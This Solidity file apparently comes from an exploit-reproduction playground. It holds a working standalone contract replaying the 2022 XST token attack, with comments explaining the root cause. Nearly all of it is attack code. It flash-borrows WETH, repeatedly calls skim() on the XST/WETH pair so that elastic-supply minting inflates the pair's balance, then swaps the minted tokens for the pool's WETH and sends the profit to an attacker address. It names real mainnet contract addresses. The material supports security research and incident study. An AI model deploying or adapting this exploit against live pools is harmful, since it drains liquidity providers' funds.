// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

// VULNERABILITY: Elastic-supply rebase token (XST) allows arbitrary minting via UniswapV2Pair.skim() self-transfers misclassified as "buy" txs
// Root cause: XST2._transfer (when sender is supported LP pool) + _getTxType + _implementBuy unconditionally mints on ANY transfer *from* the pool address (incl. pair->pair self-xfer and pair->EOA), because:
//   - skim(to) does: XST.transfer(to, bal - reserve) with msg.sender == pair contract
//   - if (isSupportedPool(sender)) { lpBurn = syncPair(sender); txType = lpBurn ? 3 : 1; }
//   - txType==1 always does getMintValue(sender=pool, amount) then _totalSupply += totalMint (and largeBals to stab/treasury)
//   - no check that the transfer corresponds to a real incoming swap/liquidity add that justifies expansion
//   - rebase: factor = _largeTotal / _totalSupply; balanceOf(a) = large[a] / factor
//     minting (totalSupply++) drops factor => inflates balanceOf(pool) even if pool's _largeBalances[pool] is unchanged
// Why skim(pair) ratchets: 
//   1. seed surplus: direct XST.transfer(attacker->pool, X/8)  [updates pool bal]
//   2. skim(pair): pair calls XST.transfer(pool->pool, surplus)  => net large[pool] unchanged but totalSupply++ (factor--) => reported balanceOf(pool) inflates
//   3. repeat 15x: each iteration skims "current" surplus (now larger), causing more mint, more inflation of bal vs fixed reserve0
//   4. final skim(attacker): skims the now-huge surplus (actual XST units moved to attacker)
//   5. attacker dumps surplus XST back into pair + calls swap to extract WETH
// Impact: Attacker mints "free" XST from the elastic accounting, drains WETH reserves of XST/WETH pair (116.99 -> ~11.63 WETH), nets ~27 WETH.
// The design assumes pool balance changes only come from controlled buy/sell paths; skim bypasses that by letting the pair contract itself originate transfers.
// Also note: reserves in pair are never in sync with XST's rebased view of balanceOf(pair) after factor changes.

// Synthetic standalone exploit for the EVM Playground (2022-08-XST_exp2).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// (the flash-swap callback `uniswapV2Call` lives on the test itself, so there
// is no standalone contract to deploy). This contract is a faithful, self-contained
// copy of that inline attack (testExploit + uniswapV2Call), so the playground can
// deploy it and record run(). Logic and constants are copied verbatim from
// test/XST_exp2.sol.
//
// Differences vs. exp1 (2022-08-XST): exp2 is the SAME bug class (skim()-driven
// elastic-supply mint) but a different, larger flash-loan + skim sequence:
//   - flash-borrows 2× the XST/WETH pair's WETH reserve from the WETH/USDT pair,
//   - buys XST out of the victim pair (pumping its WETH reserve),
//   - seeds the skim surplus with balance/8 of the bought XST,
//   - ratchets the pair's XST balance via 15× skim(pair) (each mints fresh XST),
//   - skims the inflated surplus to itself and dumps all XST for the pool's WETH,
//   - repays the flash loan (principal × 1000/997 + 1000).
// Net: +27.13 WETH, draining the victim pool from 116.99 WETH to ~11.63 WETH.
//
// The original test measures profit as the test contract's own WETH delta. Here
// the WETH stays in the contract and is forwarded to ATTACKER at the end of the
// callback so the playground can score it as the attacker EOA's WETH delta.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

interface IUniswapV2Pair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function getReserves() external view returns (uint112, uint112, uint32);
    function skim(address to) external;
}

contract XSTExploit2 {
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant XST = 0x91383A15C391c142b80045D8b4730C1c37ac0378;
    address constant Pair1 = 0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852; // WETH/USDT (flash source)
    address constant Pair2 = 0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C; // XST/WETH (victim)
    address constant ATTACKER = 0x00000000000000000000000000000000DeaDBeef;

    uint256 amount;

    function run() external {
        amount = IERC20(WETH).balanceOf(Pair2);
        // non-empty data triggers the uniswapV2Call flash-swap callback
        IUniswapV2Pair(Pair1).swap(amount * 2, 0, address(this), new bytes(1));
        // forward the net WETH profit to the receiver EOA
        uint256 weth = IERC20(WETH).balanceOf(address(this));
        IERC20(WETH).transfer(ATTACKER, weth);
    }

    function uniswapV2Call(address, uint256, uint256, bytes calldata) external {
        // --- buy XST with the flash-loaned WETH ---
        uint256 amountSellWETH = IERC20(WETH).balanceOf(address(this));
        (uint256 reserve0, uint256 reserve1,) = IUniswapV2Pair(Pair2).getReserves(); // r0:XST r1:WETH
        uint256 amountOutXST = amountSellWETH * 997 * reserve0 / (reserve1 * 1000 + amountSellWETH * 997);
        IERC20(WETH).transfer(Pair2, amountSellWETH);
        IUniswapV2Pair(Pair2).swap(amountOutXST, 0, address(this), "");

        // VULNERABILITY: seed + ratchet via skim(self) mints via pool-as-sender path
        // See header for full root cause. The following lines exercise the defect:
        //   - XST.transfer(to=Pair2) seeds initial surplus in actual balanceOf(Pair2)
        //   - repeated skim(Pair2) => pair calls XST.transfer(from=Pair2, to=Pair2, amt) 
        //     inside XST: sender=pool => txType=1 (no lpBurn) => _implementBuy mints, totalSupply++, factor drops, balanceOf(Pair2) inflates
        //   - final skim(this) extracts the artificially created surplus XST (computed as bal-reserve, now huge)
        // EXPLOIT STEPS:
        // 1. Flash 2x WETH reserve from Pair1 (WETH/USDT) into this.
        // 2. Swap all flash WETH into Pair2 for XST (updates Pair2's WETH reserve upward, XST reserve down).
        // 3. transfer(X/8) to Pair2 (seed surplus; triggers sell path but leaves bal high).
        // 4. 15x skim(Pair2): each causes self-xfer from pool triggering buy-mint + rebase inflation of pair's bal vs. fixed reserve.
        // 5. skim(this): receive the ratcheted surplus XST (free minted supply).
        // 6. transfer all received XST back to Pair2 (now creates large surplus = bal - reserve).
        // 7. swap the surplus XST out for Pair2's WETH (drains the pool).
        // 8. repay flash (amount*2 *1000/997 +1k).
        // --- seed the skim surplus, then ratchet the pair's XST via 15× skim(pair) ---
        IERC20(XST).transfer(Pair2, IERC20(XST).balanceOf(address(this)) / 8);
        for (int256 i = 0; i < 15; i++) {
            IUniswapV2Pair(Pair2).skim(Pair2);
        }
        IUniswapV2Pair(Pair2).skim(address(this));

        // --- dump the minted XST for the pool's WETH ---
        IERC20(XST).transfer(Pair2, IERC20(XST).balanceOf(address(this)));
        uint256 balanceOfXST = IERC20(XST).balanceOf(Pair2);
        (uint256 reserve3, uint256 reserve4,) = IUniswapV2Pair(Pair2).getReserves(); // r3:XST r4:WETH
        uint256 amountSellXST = balanceOfXST - reserve3;
        uint256 amountOutWETH = amountSellXST * 997 * reserve4 / (reserve3 * 1000 + amountSellXST * 997);
        IUniswapV2Pair(Pair2).swap(0, amountOutWETH, address(this), "");

        // --- repay the flash loan ---
        IERC20(WETH).transfer(Pair1, (amount * 2) * 1000 / 997 + 1000);
    }

    fallback() external payable {}
}
